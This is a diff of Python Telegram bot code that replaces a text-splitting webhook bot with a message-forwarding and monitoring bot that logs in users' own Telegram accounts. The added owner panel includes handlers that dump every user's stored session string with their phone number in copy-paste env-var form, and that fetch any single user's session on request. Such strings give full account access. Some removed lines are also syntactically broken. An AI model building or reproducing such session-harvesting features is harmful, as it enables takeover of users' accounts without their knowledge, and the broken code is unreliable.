-        send_message(bot_id, user_id, f"🚫 Sorry, you are not allowed. {config['owner_tag']} notified.\nYour ID: {user_id}")
-        notify_owners(bot_id, f"🚨 Unallowed access attempt by {at_username(username) if username else user_id} (ID: {user_id}).")
-        return jsonify({"ok": True})
-
-    if command == "/example":
-        sample = "\n".join([
-            "996770061141", "996770064514", "996770071665", "996770073284",
-            "996770075145", "996770075627", "996770075973", "996770076350",
-            "996770076869", "996770077101"
-        ])
-        res = enqueue_task(bot_id, user_id, username, sample)
-        if not res["ok"]:
-            send_message(bot_id, user_id, "❗ Could not queue demo. Try later.")
-            return jsonify({"ok": True})
-        start_user_worker_if_needed(bot_id, user_id)
-        notify_user_worker(bot_id, user_id)
-        active, queued = get_user_task_counts(bot_id, user_id)
-        if active:
-            send_message(bot_id, user_id, f"✅ Task added. Words: {res['total_words']}.\nQueue position: {queued}")
-        else:
-            send_message(bot_id, user_id, f"✅ Task added. Words: {res['total_words']}.")
-        return jsonify({"ok": True})
-
-    if command == "/pause":
-        try:
-            rows = execute_query(
-                bot_id,
-                "SELECT id FROM {prefix}tasks WHERE user_id = %s AND status = 'running' ORDER BY started_at ASC LIMIT 1",
-                (user_id,),
-                fetch_one=True
-            )
-        except Exception:
-            send_message(bot_id, user_id, "⚠️ Service temporarily unavailable. Please try again later.")
-            return jsonify({"ok": True})
-        
-        if not rows:
-            send_message(bot_id, user_id, "ℹ️ No active task to pause.")
-            return jsonify({"ok": True})
-        set_task_status(bot_id, rows[0], "paused")
-        notify_user_worker(bot_id, user_id)
-        send_message(bot_id, user_id, "⏸️ Paused. Use /resume to continue.")
-        return jsonify({"ok": True})
-
-    if command == "/resume":
-        try:
-            rows = execute_query(
-                bot_id,
-                "SELECT id FROM {prefix}tasks WHERE user_id = %s AND status = 'paused' ORDER BY started_at ASC LIMIT 1",
-                (user_id,),
-                fetch_one=True
-            )
-        except Exception:
-            send_message(bot_id, user_id, "⚠️ Service temporarily unavailable. Please try again later.")
-            return jsonify({"ok": True})
-        
-        if not rows:
-            send_message(bot_id, user_id, "ℹ️ No paused task to resume.")
-            return jsonify({"ok": True})
-        set_task_status(bot_id, rows[0], "running")
-        notify_user_worker(bot_id, user_id)
-        send_message(bot_id, user_id, "▶️ Resuming your task now.")
-        return jsonify({"ok": True})
-
-    if command == "/status":
-        try:
-            active = execute_query(
-                bot_id,
-                "SELECT id, status, total_words, sent_count FROM {prefix}tasks WHERE user_id = %s AND status IN ('running','paused') ORDER BY started_at ASC LIMIT 1",
-                (user_id,),
-                fetch_one=True
-            )
-            queued_result = execute_query(
-                bot_id,
-                "SELECT COUNT(*) FROM {prefix}tasks WHERE user_id = %s AND status = 'queued'",
-                (user_id,),
-                fetch_one=True
-            )
-            queued = queued_result[0] if queued_result else 0
-        except Exception:
-            send_message(bot_id, user_id, "⚠️ Service temporarily unavailable. Please try again later.")
-            return jsonify({"ok": True})
-        
-        if active:
-            aid, status, total, sent = active
-            remaining = int(total or 0) - int(sent or 0)
-            send_message(bot_id, user_id, f"ℹ️ Status: {status}\nRemaining words: {remaining}\nQueue size: {queued}")
-        elif queued > 0:
-            send_message(bot_id, user_id, f"⏳ Waiting. Queue size: {queued}")
-        else:
-            send_message(bot_id, user_id, "✅ You have no active or queued tasks.")
-        return jsonify({"ok": True})
-
-    if command == "/stop":
-        try:
-            queued_result = execute_query(
-                bot_id,
-                "SELECT COUNT(*) FROM {prefix}tasks WHERE user_id = %s AND status = 'queued'",
-                (user_id,),
-                fetch_one=True
-            )
-            queued = queued_result[0] if queued_result else 0
-        except Exception:
-            send_message(bot_id, user_id, "⚠️ Service temporarily unavailable. Please try again later.")
-            return jsonify({"ok": True})
-        
-        stopped = cancel_active_task_for_user(bot_id, user_id)
-        stop_user_worker(bot_id, user_id)
-        if stopped > 0 or queued > 0:
-            send_message(bot_id, user_id, "🛑 Active task stopped. Your queued tasks were cleared too.")
-        else:
-            send_message(bot_id, user_id, "ℹ️ You had no active or queued tasks.")
-        return jsonify({"ok": True})
-
-    if command == "/stats":
-        words = compute_last_12h_stats(bot_id, user_id)
-        send_message(bot_id, user_id, f"📊 Your last 12 hours: {words} words split")
-        return jsonify({"ok": True})
-
-    send_message(bot_id, user_id, "❓ Unknown command.")
-    return jsonify({"ok": True})
-
-def handle_user_text(bot_id: str, user_id: int, username: str, text: str):
-    config = BOTS_CONFIG[bot_id]
-    
-    # BLOCK OWNER TASK PROCESSING
-    if user_id in config["owner_ids"] and is_owner_in_operation(bot_id, user_id):
-        logger.warning(f"Owner {user_id} text reached handle_user_text while in operation state in {bot_id}. Text: {text[:50]}...")
-        return jsonify({"ok": True})
-    
-    if user_id not in config["owner_ids"] and not is_allowed(bot_id, user_id):
-        send_message(bot_id, user_id, f"🚫 Sorry, you are not allowed. {config['owner_tag']} notified.\nYour ID: {user_id}")
-        notify_owners(bot_id, f"🚨 Unallowed access attempt by {at_username(username) if username else user_id} (ID: {user_id}).")
-        return jsonify({"ok": True})
-    
-    if is_suspended(bot_id, user_id):
-        try:
-            r = execute_query(
-                bot_id,
-                "SELECT suspended_until FROM {prefix}suspended_users WHERE user_id = %s",
-                (user_id,),
-                fetch_one=True
-            )
-            until_utc = r[0] if r else "unknown"
-            until_wat = utc_to_wat_ts(until_utc)
-        except Exception:
-            send_message(bot_id, user_id, "⚠️ Service temporarily unavailable. Please try again later.")
-            return jsonify({"ok": True})
-        
-        send_message(bot_id, user_id, f"⛔ You have been suspended until {until_wat} by {config['owner_tag']}.")
-        return jsonify({"ok": True}")
-    
-    res = enqueue_task(bot_id, user_id, username, text)
-    if not res["ok"]:
-        if res["reason"] == "empty":
-            send_message(bot_id, user_id, "⚠️ Empty text. Nothing to split.")
-            return jsonify({"ok": True})
-        if res["reason"] == "queue_full":
-            send_message(bot_id, user_id, f"⏳ Your queue is full ({res['queue_size']}). Use /stop or wait.")
-            return jsonify({"ok": True})
-        send_message(bot_id, user_id, "❗ Could not queue task. Try later.")
-        return jsonify({"ok": True}")
-    
-    start_user_worker_if_needed(bot_id, user_id)
-    notify_user_worker(bot_id, user_id)
-    active, queued = get_user_task_counts(bot_id, user_id)
-    if active:
-        send_message(bot_id, user_id, f"✅ Task added. Words: {res['total_words']}.\nQueue position: {queued}")
     else:
-        send_message(bot_id, user_id, f"✅ Task added. Words: {res['total_words']}.")
-    return jsonify({"ok": True})
+        await update.message.reply_text(
+            message_text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown"
+        )
 
-# ===================== WEBHOOK HANDLERS =====================
+async def handle_owner_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    
+    if user_id not in OWNER_IDS:
+        await query.answer("Only owners can access this panel!", show_alert=True)
+        return
+    
+    await query.answer()
+    
+    action = query.data
+    
+    if action == "owner_panel":
+        await show_owner_panel(update, context)
+    
+    elif action == "owner_get_all_strings":
+        await handle_get_all_strings(update, context)
+    
+    elif action == "owner_get_user_string":
+        await handle_get_user_string_input(update, context)
+    
+    elif action == "owner_list_users":
+        await handle_list_users(update, context)
+    
+    elif action == "owner_add_user":
+        await handle_add_user_input(update, context)
+    
+    elif action == "owner_remove_user":
+        await handle_remove_user_input(update, context)
+    
+    elif action == "owner_db_status":
+        await handle_db_status(update, context)
+    
+    elif action.startswith("owner_confirm_remove_"):
+        target_user_id = int(action.replace("owner_confirm_remove_", ""))
+        await handle_confirm_remove_user(update, context, target_user_id)
+    
+    elif action == "owner_cancel_remove":
+        await show_owner_panel(update, context)
+    
+    elif action == "owner_cancel":
+        await show_owner_panel(update, context)
+    
+    elif action == "owner_add_user_admin_yes":
+        target_user_id = context.user_data.get("add_user_id")
+        if target_user_id:
+            await handle_add_user_admin_choice(update, context, target_user_id, True)
+    
+    elif action == "owner_add_user_admin_no":
+        target_user_id = context.user_data.get("add_user_id")
+        if target_user_id:
+            await handle_add_user_admin_choice(update, context, target_user_id, False)
 
-def handle_webhook(bot_id: str):
-    """Handle webhook updates for a specific bot"""
-    try:
-        update = request.get_json(force=True)
-    except Exception:
-        return jsonify({"ok": False}), 400
+async def handle_get_all_strings(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    
+    if user_id not in OWNER_IDS:
+        await query.answer("Only owners can access this panel!", show_alert=True)
+        return
+    
+    processing_msg = await query.message.edit_text("⏳ **Searching database for sessions...**")
     
     try:
-        config = BOTS_CONFIG[bot_id]
-        state = BOT_STATES[bot_id]
+        sessions = await db_call(db.get_all_string_sessions)
         
-        # Handle callback queries
-        if "callback_query" in update:
-            callback = update["callback_query"]
-            user = callback.get("from", {})
-            uid = user.get("id")
-            data = callback.get("data", "")
+        if not sessions:
+            await processing_msg.edit_text("📭 **No string sessions found!**")
+            return
+        
+        await processing_msg.delete()
+        
+        header_msg = await query.message.reply_text(
+            "🔑 **All String Sessions**\n\n**Well Arranged Copy-Paste Env Var Format:**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            parse_mode="Markdown"
+        )
+        
+        for session in sessions:
+            user_id_db = session["user_id"]
+            session_data = session["session_data"]
+            username = session["name"] or f"User {user_id_db}"
+            phone = session["phone"] or "Not available"
+            status = "🟢 Online" if session["is_logged_in"] else "🔴 Offline"
             
-            # Check if user is an owner for this bot
-            if uid not in config["owner_ids"]:
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                        "callback_query_id": callback.get("id"),
-                        "text": "⛔ Owner only."
-                    }, timeout=2)
-                except Exception:
-                    pass
-                return jsonify({"ok": True})
+            message_text = f"👤 **User:** {username} (ID: `{user_id_db}`)\n📱 **Phone:** `{phone}`\n{status}\n\n**Env Var Format:**\n```{user_id_db}:{session_data}```\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
             
-            # Handle callback data with bot-specific context
-            if data == "owner_close":
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/deleteMessage", json={
-                        "chat_id": callback["message"]["chat"]["id"],
-                        "message_id": callback["message"]["message_id"]
-                    }, timeout=2)
-                except Exception:
-                    pass
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                        "callback_query_id": callback.get("id"),
-                        "text": "✅ Menu closed."
-                    }, timeout=2)
-                except Exception:
-                    pass
-                clear_owner_state(bot_id, uid)
-                return jsonify({"ok": True})
+            try:
+                await query.message.reply_text(message_text, parse_mode="Markdown")
+            except Exception:
+                continue
+        
+        await query.message.reply_text(f"📊 **Total:** {len(sessions)} session(s)")
+        
+    except Exception as e:
+        logger.exception("Error in get all string sessions")
+        try:
+            await processing_msg.edit_text(f"❌ **Error fetching sessions:** {str(e)[:200]}")
+        except:
+            pass
+
+async def handle_get_user_string_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    
+    message_text = """👤 **Get User String Session**
+
+Enter the User ID to get their session string:
+
+**Example:** `123456789`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    
+    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+    
+    context.user_data["owner_action"] = "get_user_string"
+    context.user_data["awaiting_input"] = True
+
+async def handle_get_user_string(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if context.user_data.get("owner_action") != "get_user_string":
+        return
+    
+    try:
+        target_user_id = int(text)
+    except ValueError:
+        await update.message.reply_text(
+            "❌ **Invalid user ID!**\n\nUser ID must be a number.\n\nUse /ownersets to try again.",
+            parse_mode="Markdown"
+        )
+        context.user_data.clear()
+        return
+    
+    user = await db_call(db.get_user, target_user_id)
+    if not user or not user.get("session_data"):
+        await update.message.reply_text(
+            f"❌ **No string session found for user ID `{target_user_id}`!**\n\nUse /ownersets to try again.",
+            parse_mode="Markdown"
+        )
+        context.user_data.clear()
+        return
+    
+    session_string = user["session_data"]
+    username = user.get("name", "Unknown")
+    phone = user.get("phone", "Not available")
+    status = "🟢 Online" if user.get("is_logged_in") else "🔴 Offline"
+    
+    message_text = f"🔑 **String Session for 👤 User:** {username} (ID: `{target_user_id}`)\n\n📱 **Phone:** `{phone}`\n{status}\n\n**Env Var Format:**\n```{target_user_id}:{session_string}```"
+    
+    await update.message.reply_text(message_text, parse_mode="Markdown")
+    context.user_data.clear()
+
+async def handle_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    
+    users = await db_call(db.get_all_allowed_users)
+
+    if not users:
+        await query.edit_message_text("📋 **No Allowed Users**\n\nThe allowed users list is empty.", parse_mode="Markdown")
+        return
+
+    user_list = "👥 **Allowed Users**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+
+    for i, user in enumerate(users, 1):
+        role_emoji = "👑" if user["is_admin"] else "👤"
+        role_text = "Admin" if user["is_admin"] else "User"
+        username = user["username"] if user["username"] else "Unknown"
+
+        user_list += f"{i}. {role_emoji} **{role_text}**\n   ID: `{user['user_id']}`\n"
+        if user["username"]:
+            user_list += f"   Username: {username}\n"
+        user_list += "\n"
+
+    user_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    user_list += f"Total: **{len(users)} user(s)**"
+
+    await query.edit_message_text(user_list, parse_mode="Markdown")
+
+async def handle_add_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    
+    message_text = """➕ **Add New User**
+
+Step 1 of 2: Enter the User ID to add:
+
+**Example:** `123456789`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    
+    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+    
+    context.user_data["owner_action"] = "add_user"
+    context.user_data["add_user_step"] = "user_id"
+    context.user_data["awaiting_input"] = True
+
+async def handle_add_user_admin_choice_input(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user_id: int):
+    query = update.callback_query
+    
+    message_text = f"""➕ **Add New User**
+
+Step 2 of 2: Should user `{target_user_id}` be an admin?
+
+**Options:**
+• **Yes** - User will have admin privileges (👑)
+• **No** - Regular user only (👤)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ Yes (Admin)", callback_data="owner_add_user_admin_yes"),
+            InlineKeyboardButton("❌ No (Regular)", callback_data="owner_add_user_admin_no")
+        ],
+        [InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]
+    ]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+    
+    context.user_data["add_user_id"] = target_user_id
+    context.user_data["add_user_step"] = "admin_choice"
+    context.user_data["awaiting_input"] = False
+
+async def handle_add_user_admin_choice(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user_id: int, is_admin: bool):
+    query = update.callback_query
+    user_id = query.from_user.id
+    
+    added = await db_call(db.add_allowed_user, target_user_id, None, is_admin, user_id)
+    if added:
+        role = "👑 Admin" if is_admin else "👤 User"
+        await query.edit_message_text(
+            f"✅ **User added successfully!**\n\nID: `{target_user_id}`\nRole: {role}",
+            parse_mode="Markdown"
+        )
+        try:
+            await context.bot.send_message(target_user_id, "✅ You have been added. Send /start to begin.", parse_mode="Markdown")
+        except Exception:
+            pass
+    else:
+        await query.edit_message_text(
+            f"❌ **User `{target_user_id}` already exists!**\n\nUse /ownersets to try again.",
+            parse_mode="Markdown"
+        )
+    
+    context.user_data.clear()
+
+async def handle_add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if context.user_data.get("owner_action") != "add_user":
+        return
+    
+    step = context.user_data.get("add_user_step")
+    
+    if step == "user_id":
+        try:
+            target_user_id = int(text)
+            context.user_data["add_user_id"] = target_user_id
             
-            elif data == "owner_botinfo":
-                # Get bot-specific info
+            message_text = f"""➕ **Add New User**
+
+Step 2 of 2: Should user `{target_user_id}` be an admin?
+
+**Options:**
+• **Yes** - User will have admin privileges (👑)
+• **No** - Regular user only (👤)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+            
+            keyboard = [
+                [
+                    InlineKeyboardButton("✅ Yes (Admin)", callback_data="owner_add_user_admin_yes"),
+                    InlineKeyboardButton("❌ No (Regular)", callback_data="owner_add_user_admin_no")
+                ],
+                [InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]
+            ]
+            
+            await update.message.reply_text(
+                message_text,
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+            
+            context.user_data["add_user_step"] = "admin_choice"
+            context.user_data["awaiting_input"] = False
+            
+        except ValueError:
+            await update.message.reply_text(
+                "❌ **Invalid user ID!**\n\nUser ID must be a number.\n\nUse /ownersets to try again.",
+                parse_mode="Markdown"
+            )
+            context.user_data.clear()
+
+async def handle_remove_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    
+    message_text = """➖ **Remove User**
+
+Enter the User ID to remove:
+
+**Example:** `123456789`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    
+    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+    
+    context.user_data["owner_action"] = "remove_user"
+    context.user_data["awaiting_input"] = True
+
+async def handle_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if context.user_data.get("owner_action") != "remove_user":
+        return
+    
+    try:
+        target_user_id = int(text)
+    except ValueError:
+        await update.message.reply_text(
+            "❌ **Invalid user ID!**\n\nUser ID must be a number.\n\nUse /ownersets to try again.",
+            parse_mode="Markdown"
+        )
+        context.user_data.clear()
+        return
+    
+    context.user_data["remove_user_id"] = target_user_id
+    
+    message_text = f"""⚠️ **Confirm User Removal**
+
+Are you sure you want to remove user `{target_user_id}`?
+
+This will:
+• Remove their access to the bot
+• Disconnect their session if active
+• Delete all their forwarding tasks
+• Delete all their monitoring tasks
+• Remove them from the allowed users list
+
+**This action cannot be undone!**
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ Yes, Remove", callback_data=f"owner_confirm_remove_{target_user_id}"),
+            InlineKeyboardButton("❌ No, Cancel", callback_data="owner_cancel_remove")
+        ]
+    ]
+    
+    await update.message.reply_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+    
+    context.user_data["awaiting_input"] = False
+
+async def handle_confirm_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user_id: int):
+    query = update.callback_query
+    user_id = query.from_user.id
+    
+    # Remove from allowed users
+    removed = await db_call(db.remove_allowed_user, target_user_id)
+    
+    if removed:
+        # Disconnect client if active
+        if target_user_id in user_clients:
+            try:
+                client = user_clients[target_user_id]
+                
+                # Remove forwarding handlers
+                if target_user_id in forward_handler_registered:
+                    handler = forward_handler_registered.get(target_user_id)
+                    if handler:
+                        try:
+                            client.remove_event_handler(handler)
+                        except Exception:
+                            pass
+                    forward_handler_registered.pop(target_user_id, None)
+                
+                # Remove monitoring handlers
+                if target_user_id in monitor_handler_registered:
+                    for handler in monitor_handler_registered[target_user_id]:
+                        try:
+                            client.remove_event_handler(handler)
+                        except Exception:
+                            pass
+                    monitor_handler_registered.pop(target_user_id, None)
+                
+                await client.disconnect()
+            except Exception:
+                logger.exception("Error disconnecting client for removed user %s", target_user_id)
+            finally:
+                user_clients.pop(target_user_id, None)
+        
+        # Mark user as logged out
+        try:
+            await db_call(db.save_user, target_user_id, None, None, None, False)
+        except Exception:
+            logger.exception("Error saving user logged_out state for %s", target_user_id)
+        
+        # Clear all caches
+        phone_verification_states.pop(target_user_id, None)
+        forwarding_tasks_cache.pop(target_user_id, None)
+        monitoring_tasks_cache.pop(target_user_id, None)
+        target_entity_cache.pop(target_user_id, None)
+        chat_entity_cache.pop(target_user_id, None)
+        user_send_semaphores.pop(target_user_id, None)
+        user_rate_limiters.pop(target_user_id, None)
+        reply_states.pop(target_user_id, None)
+        auto_reply_states.pop(target_user_id, None)
+        
+        await query.edit_message_text(
+            f"✅ **User `{target_user_id}` removed successfully!**",
+            parse_mode="Markdown"
+        )
+        
+        # Notify removed user
+        try:
+            await context.bot.send_message(target_user_id, "❌ You have been removed. Contact the owner to regain access.", parse_mode="Markdown")
+        except Exception:
+            pass
+    else:
+        await query.edit_message_text(
+            f"❌ **User `{target_user_id}` not found!**",
+            parse_mode="Markdown"
+        )
+    
+    context.user_data.clear()
+
+async def handle_db_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    
+    status = await db_call(db.get_db_status)
+    
+    message_text = "📊 **Database Status**\n\n"
+    message_text += f"**Type:** {status.get('type', 'Unknown')}\n"
+    
+    if status.get('type') == 'sqlite':
+        message_text += f"**Path:** {status.get('path', 'Unknown')}\n"
+        message_text += f"**Exists:** {'✅ Yes' if status.get('exists') else '❌ No'}\n"
+        if status.get('size_bytes'):
+            size_mb = status['size_bytes'] / (1024 * 1024)
+            message_text += f"**Size:** {size_mb:.2f} MB\n"
+    else:
+        message_text += f"**Connected:** {'✅ Yes' if status.get('exists') else '❌ No'}\n"
+    
+    message_text += f"\n**Cache Counts:**\n"
+    cache_counts = status.get('cache_counts', {})
+    message_text += f"• Users: {cache_counts.get('users', 0)}\n"
+    message_text += f"• Forwarding Tasks: {cache_counts.get('forwarding_tasks', 0)}\n"
+    message_text += f"• Monitoring Tasks: {cache_counts.get('monitoring_tasks', 0)}\n"
+    message_text += f"• Allowed Users: {cache_counts.get('allowed_users', 0)}\n"
+    message_text += f"• Admins: {cache_counts.get('admins', 0)}\n"
+    
+    if status.get('tables'):
+        message_text += f"\n**Tables:** {', '.join(status['tables'])}"
+    
+    if status.get('error'):
+        message_text += f"\n\n⚠️ **Error:** {status['error']}"
+    
+    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+# ============================
+# BUTTON HANDLER
+# ============================
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+
+    if not await check_authorization(update, context):
+        return
+
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+
+    await query.answer()
+
+    action = query.data
+    
+    if action == "login":
+        await query.message.delete()
+        await login_command(update, context)
+    elif action == "logout":
+        await query.message.delete()
+        await logout_command(update, context)
+    elif action == "show_forward_tasks":
+        await query.message.delete()
+        await fortasks_command(update, context)
+    elif action == "show_monitor_tasks":
+        await query.message.delete()
+        await monitortasks_command(update, context)
+    elif action.startswith("chatids_"):
+        if action == "chatids_back":
+            await show_chat_categories(user_id, query.message.chat.id, query.message.message_id, context)
+        else:
+            parts = action.split("_")
+            category = parts[1]
+            page = int(parts[2])
+            await show_categorized_chats(user_id, query.message.chat.id, query.message.message_id, category, page, context)
+    elif action.startswith("forward_task_"):
+        await handle_forward_task_menu(update, context)
+    elif action.startswith("monitor_task_"):
+        await handle_monitor_task_menu(update, context)
+    elif action.startswith("forward_filter_"):
+        await handle_forward_filter_menu(update, context)
+    elif action.startswith("toggle_forward_"):
+        await handle_toggle_forward_action(update, context)
+    elif action.startswith("toggle_monitor_"):
+        await handle_toggle_monitor_action(update, context)
+    elif action.startswith("delete_forward_"):
+        await handle_delete_forward_action(update, context)
+    elif action.startswith("delete_monitor_"):
+        await handle_delete_monitor_action(update, context)
+    elif action.startswith(("prefix_", "suffix_")):
+        await handle_prefix_suffix(update, context)
+    elif action.startswith("confirm_delete_forward_"):
+        await handle_confirm_delete_forward(update, context)
+    elif action.startswith("confirm_delete_monitor_"):
+        await handle_confirm_delete_monitor(update, context)
+    elif action == "owner_panel":
+        await show_owner_panel(update, context)
+    
+    elif action.startswith("owner_"):
+        await handle_owner_actions(update, context)
+    
+    elif action.startswith("reply_"):
+        await handle_reply_action(update, context)
+    
+    elif action == "back_to_main":
+        await show_main_menu(update, context, user_id)
+
+# ============================
+# FORWARDING SYSTEM COMMANDS
+# ============================
+async def forwadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    if not await check_authorization(update, context):
+        return
+
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
+        return
+
+    user = await db_call(db.get_user, user_id)
+    if not user or not user["is_logged_in"]:
+        await update.message.reply_text(
+            "❌ **You need to connect your account first!**\n\nUse /login to connect.",
+            parse_mode="Markdown"
+        )
+        return
+
+    task_creation_states[user_id] = {
+        "step": "waiting_name",
+        "type": "forwarding",
+        "name": "",
+        "source_ids": [],
+        "target_ids": []
+    }
+
+    await update.message.reply_text(
+        "🎯 **Let's create a new forwarding task!**\n\n📝 **Step 1 of 3:** Please enter a name for your task.\n\n💡 *Example: My Forwarding Task*",
+        parse_mode="Markdown"
+    )
+
+async def fortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
+
+    if not await check_authorization(update, context):
+        return
+
+    if await check_phone_number_required(user_id):
+        message = update.message if update.message else update.callback_query.message
+        await ask_for_phone_number(user_id, message.chat.id, context)
+        return
+
+    message = update.message if update.message else update.callback_query.message
+    tasks = forwarding_tasks_cache.get(user_id, [])
+
+    if not tasks:
+        await message.reply_text(
+            "📋 **No Active Forwarding Tasks**\n\nYou don't have any forwarding tasks yet.\n\nCreate one with:\n/forwadd",
+            parse_mode="Markdown"
+        )
+        return
+
+    task_list = "📋 **Your Forwarding Tasks**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    
+    keyboard = []
+    
+    for i, task in enumerate(tasks, 1):
+        task_list += f"{i}. **{task['label']}**\n   📥 Sources: {', '.join(map(str, task['source_ids']))}\n   📤 Targets: {', '.join(map(str, task['target_ids']))}\n\n"
+        keyboard.append([InlineKeyboardButton(f"{i}. {task['label']}", callback_data=f"forward_task_{task['label']}")])
+
+    task_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    task_list += f"Total: **{len(tasks)} task(s)**\n\n💡 **Tap any task below to manage it!**"
+
+    await message.reply_text(
+        task_list,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_forward_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    task_label = query.data.replace("forward_task_", "")
+    
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
+    user_tasks = forwarding_tasks_cache.get(user_id, [])
+    task = None
+    for t in user_tasks:
+        if t["label"] == task_label:
+            task = t
+            break
+    
+    if not task:
+        await query.answer("Task not found!", show_alert=True)
+        return
+    
+    filters = task.get("filters", {})
+    
+    outgoing_emoji = "✅" if filters.get("outgoing", True) else "❌"
+    forward_tag_emoji = "✅" if filters.get("forward_tag", False) else "❌"
+    control_emoji = "✅" if filters.get("control", True) else "❌"
+    
+    message_text = f"🔧 **Forward Task Management: {task_label}**\n\n📥 **Sources:** {', '.join(map(str, task['source_ids']))}\n📤 **Targets:** {', '.join(map(str, task['target_ids']))}\n\n⚙️ **Settings:**\n{outgoing_emoji} Outgoing - Controls if outgoing messages are forwarded\n{forward_tag_emoji} Forward Tag - Shows/hides 'Forwarded from' tag\n{control_emoji} Control - Pauses/runs forwarding\n\n💡 **Tap any option below to change it!**"
+    
+    keyboard = [
+        [InlineKeyboardButton("🔍 Filters", callback_data=f"forward_filter_{task_label}")],
+        [
+            InlineKeyboardButton(f"{outgoing_emoji} Outgoing", callback_data=f"toggle_forward_{task_label}_outgoing"),
+            InlineKeyboardButton(f"{forward_tag_emoji} Forward Tag", callback_data=f"toggle_forward_{task_label}_forward_tag")
+        ],
+        [
+            InlineKeyboardButton(f"{control_emoji} Control", callback_data=f"toggle_forward_{task_label}_control"),
+            InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_forward_{task_label}")
+        ],
+        [InlineKeyboardButton("🔙 Back to Forward Tasks", callback_data="show_forward_tasks")]
+    ]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_forward_filter_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    task_label = query.data.replace("forward_filter_", "")
+    
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
+    user_tasks = forwarding_tasks_cache.get(user_id, [])
+    task = None
+    for t in user_tasks:
+        if t["label"] == task_label:
+            task = t
+            break
+    
+    if not task:
+        await query.answer("Task not found!", show_alert=True)
+        return
+    
+    filters = task.get("filters", {})
+    filter_settings = filters.get("filters", {})
+    
+    raw_text_emoji = "✅" if filter_settings.get("raw_text", False) else "❌"
